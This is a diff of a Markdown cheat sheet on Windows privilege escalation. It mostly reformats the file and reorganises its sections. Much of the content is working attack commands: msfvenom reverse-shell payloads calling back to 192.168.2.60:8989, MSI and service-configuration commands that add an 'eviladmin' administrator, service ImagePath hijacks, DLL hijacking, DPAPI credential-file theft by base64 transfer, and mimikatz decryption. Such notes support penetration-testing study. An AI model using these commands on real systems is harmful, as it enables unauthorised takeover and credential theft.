@@ -1,80 +1,37 @@
-# Privilege Escalation
+# Windows Privilege Escalation
 
 ## Options
+
 - Missing Patches
 - Automated Deployment and Auto Logon Passwords
 - AlwaysInstallElevated (any user can run MSI as SYSTEM)
 - Misconfigured Services
+- DLL Hijacking
+- Token Impersonation
 
 ## Guides
-- https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Flow%20Charts/Privilege%20Escalation/windows.md
-- https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Privilege%20Escalation/Windows/windows-services.md
-- https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
-- Windows Privilege Escalation Fundamentals: http://www.fuzzysecurity.com/tutorials/16.html
+
+- <https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Flow%20Charts/Privilege%20Escalation/windows.md>
+- <https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Privilege%20Escalation/Windows/windows-services.md>
+- <https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/>
+- Windows Privilege Escalation Fundamentals: <http://www.fuzzysecurity.com/tutorials/16.html>
 
 ## Tools
-- https://github.com/pentestmonkey/windows-privesc-check/raw/master/windows-privesc-check2.exe
-- BeRoot: https://github.com/AlessandroZ/BeRoot/tree/master/Windows
-- Windows-Exploit-Suggester - https://github.com/GDSSecurity/Windows-Exploit-Suggester
-- Check Insecure Services: https://gist.github.com/wdormann/db533d84df57a70e9580a6a2127e33bb
+
+- <https://github.com/pentestmonkey/windows-privesc-check/raw/master/windows-privesc-check2.exe>
+- BeRoot: <https://github.com/AlessandroZ/BeRoot/tree/master/Windows>
+- Windows-Exploit-Suggester - <https://github.com/GDSSecurity/Windows-Exploit-Suggester>
+- Check Insecure Services: <https://gist.github.com/wdormann/db533d84df57a70e9580a6a2127e33bb>
 
 ## Metasploit
 
 In 32bit systems:
-```
+```bat
 local_exploit_suggester
 ```
-
 In 64bit systems:
-```
+```bat
 search exploit/windows/local
-```
-## PowerUp
-
-PowerUp to check for all service misconfigurations:
-```
-Invoke-AllChecks
-```
-
-### Service Unquoted Path
-
-```powershell
-Get-ServiceUnquoted -Verbose
-```
-
-```powershell
-Get-WmiObject -Class win32_service | f` *
-```
-
-When service path is unquoted:
-```
-C:\PROGRAM FILES\SUB DIR\PROGRAM NAME
-```
-
-Areas we can place files for exploit are marked with *
-```
-C:\PROGRAM*FILES\SUB*DIR\PROGRAM*NAME
-```
-
-Examples:
-```
-c:\program.exe files\sub dir\program name
-c:\program files\sub.exe dir\program name
-c:\program files\sub dir\program.exe name
-```
-
-### Service binary in a location writable to current user
-
-Replace the binary to gain code execution.
-
-```
-Get-ModifiableServiceFile -Verbose
-```
-
-### Service can be modified by current user
-
-```
-Get-ModifiableService -Verbose
 ```
 
 ## Techniques
@@ -83,10 +40,11 @@ Get-ModifiableService -Verbose
 
 - `exploit/windows/local/trusted_service_path`
 
-```
+```bat
 wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
 ```
-```
+
+```bat
 C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
 
 Leads to running:
@@ -98,7 +56,7 @@ C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
 ```
 
 Insecure Setup:
-```
+```bat
 C:\Program Files (x86)>icacls "C:\Program Files (x86)\Program Folder" /grant Everyone:(OI)(CI)F /T
 
 F = Full Control
@@ -124,12 +82,12 @@ Need to migrate (auto-migration)
 - https://msdn.microsoft.com/en-us/library/bb727008.aspx
 
 If folder is writable, drop a exe and use "Service Unquoted Path" to execute:
-```
+```bat
 icacls "C:\Program Files (x86)\Program Folder"
 ```
 
 If service exe is writable to everyone, low privilege user can replace the exe with some other binary:
-```
+```bat
 icacls example.exe
 ```
 
@@ -139,7 +97,7 @@ CI = Container Inherit - This flag indicates that subordinate containers will in
 OI = Object Inherit - This flag indicates that subordinate files will inherit the ACE.
 ```
 
-```
+```bat
 accesschk.exe -dqv "C:\" /accepteula
 ```
 
@@ -148,26 +106,26 @@ accesschk.exe -dqv "C:\" /accepteula
 - `exploit/windows/local/service_permissions`
 
 #### Approach 1 - Check permissions of service
-```
+```bat
 subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service" /display
 ```
 If service is editable, change the `ImagePath` to another exe.
-```
+```bat
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\testuser\AppData\Local\Temp\Payload.exe" /f
 ```
 
 or create a local admin with:
-```
+```bat
 sc config "Vulnerable Service" binpath="net user eviladmin P4ssw0rd@ /add
 sc config "Vulnerable Service" binpath="net localgroup Administrators eviladmin /add"
 ```
 
 #### Approach 2 - Check services a given user can edit
-```
+```bat
 accesschk.exe -uwcqv "testuser" *
 ```
 
-```
+```bat
 accesschk.exe -uwcqv "Authenticated Users" * /accepteula
 accesschk.exe -uwcqv * /accepteula
 
@@ -196,28 +154,28 @@ net start upnphost
 ### AlwaysInstallElevated
 - `exploit/windows/local/always_install_elevated`
 
-```
+```bat
 [HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer]
 "AlwaysInstallElevated"=dword:00000001
 
 [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer]
 "AlwaysInstallElevated"=dword:00000001
 ```
-```
+```bat
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
 
 Installing MSI:
-```
+```bat
 msiexec /quiet /qn /i malicious.msi
 ```
 
 Payload Generation:
-```
+```bat
 msfvenom -f msi-nouac -p windows/adduser USER=eviladmin PASS=P4ssw0rd@ -o add_user.msi
 ```
-```
+```bat
 msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o Payload.exe
 msfvenom -f msi-nouac -p windows/exec cmd="C:\Users\testuser\AppData\Local\Temp\Payload.exe" > malicious.msi
 ```
@@ -256,7 +214,7 @@ Directories in the PATH environment variable (system then user)
 - Services running under SYSTEM does not search through user path environment.
 
 Example:
-```
+```c
 #include "stdafx.h"
 #include "windows.h"
 void _tmain(int argc, _TCHAR* argv[])
@@ -270,7 +228,7 @@ Identify processes / services
     - Filter `Result` = `NAME NOT FOUND` and `Path` ends with `dll`
 - Look at the registry key `ServiceDll` of services (`Parameters`).
 
-```
+```bat
 msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.2.60 lport=8989 -f dll > hijackable.dll
 ```
 #### Windows 7
@@ -282,7 +240,7 @@ Windows Media Center Scheduler Service (ehSched) – ehETW.dll
 ```
 
 Can run Media Center services over command line:
-```
+```bat
 schtasks.exe /run /I /TN “\Microsoft\Windows\Media Center\mcupdate”
 schtasks.exe /run /I /TN “\Microsoft\Windows\Media Center\MediaCenterRecoveryTask”
 schtasks.exe /run /I /TN “\Microsoft\Windows\Media Center\ActivateWindowsSearch”
@@ -518,7 +476,7 @@ Select-String​ runas }
 #### Windows Data Protection API
 
 Locating `credential files`
-```
+```bat
 cmd​ /c "​ dir​ /S /AS C:\Users\security\AppData\Local\Microsoft\Vault & ​ dir​ /S /AS
 C:\Users\security\AppData\Local\Microsoft\Credentials & ​ dir​ /S /AS
 C:\Users\security\AppData\Local\Microsoft\Protect & ​ dir​ /S /AS
@@ -528,11 +486,11 @@ C:\Users\security\AppData\Roaming\Microsoft\Protect"
 ```
 
 Transfer
-```
+```bat
 [Convert]::ToBase64String([IO.File]::ReadAllBytes(​ "C:\Users\security\AppData\Roamin
 g\Microsoft\Credentials\51AB168BE4BDB3A603DADE4F8CA81290"​ ))
 ```
-```
+```bat
 [IO.File]::WriteAllBytes(​ "51AB168BE4BDB3A603DADE4F8CA81290"​ ,
 [Convert]::FromBase64String(​ "AQAAAA4CAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAALsOSB6
 VI40+LQ9k9ZFkFgAAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAI
@@ -549,50 +507,59 @@ BU7zWC+/QdKUJjqDlUviAlWLFU5hbqocgqCjmHgW9XRy4IAcRVRoQDtO4U1mLOHW6kLaJvEgzQvv2cbi
 Extraction credential file -> masterkey (guidMasterKey)
 - [https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)
 
-```
+```bat
 dpapi::​ cred​ /​ in​ :51​ AB168BE4BDB3A603DADE4F8CA81290
 /​ sid:S​ -1-5-21-953262931-566350628-63446256-1001 /​ password​ :4​ Cc3ssC0ntr0ller
 ```
 
 Examine master key file
-```
+```bat
 dpapi::​ masterkey​ /​ in​ :0792​ c32e​ -48​ a5​ -4​ fe3​ -8​ b43​ - ​ d93d64590580
 /​ sid:S​ -1-5-21-953262931-566350628-63446256-1001 /​ password​ :4​ Cc3ssC0ntr0ller
 ```
 
 Decrypt credential blob
-```
+```bat
 dpapi::​ cred​ /​ in​ :51​ AB168BE4BDB3A603DADE4F8CA81290
 ```
 
 ### Using Kernel Exploit
 
 Installed updates:
-```
+```bat
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 
 ```
 KiTrap0d
 
-## Using logical flaws
+### Using logical flaws
 
-### Directory Replication Service (DRSR)
+### Other
 
-###Netlogon Remote Service (NRPC)
+#### Directory Replication Service (DRSR)
 
-###BackupKey Remote Service (BKRP)
+#### Netlogon Remote Service (NRPC)
 
-###Local Service Authority (Domain Policy) Remote Protocol (LSAD)
+#### BackupKey Remote Service (BKRP)
 
-###Privilege Attribute Certificate Data Structure (PAC)
+#### Local Service Authority (Domain Policy) Remote Protocol (LSAD)
 
-### Kerberos
+#### Privilege Attribute Certificate Data Structure (PAC)
 
-#### Kerberos Protocol Extension (KILE)
+#### Kerberos
 
-#### Kerberos Protocol Extension, Service for User and Constrained Delegation Protocol (SFU)
+##### Kerberos Protocol Extension (KILE)
 
-### Add user using service misconfiguration
+##### Kerberos Protocol Extension, Service for User and Constrained Delegation Protocol (SFU)
+
+#### Add user using service misconfiguration
+
+## PowerUp
+
+- Perform all checks: `Invoke-AllChecks`
+- Services with unquoted paths and a space in their name: `Get-ServiceUnquoted -Verbose`
+- Service binary in a location writable to current user (Replace the binary to gain code execution): `Get-ModifiableServiceFile -Verbose`
+- Service can be modified by current user: `Get-ModifiableService -Verbose`
 
 ## References
 
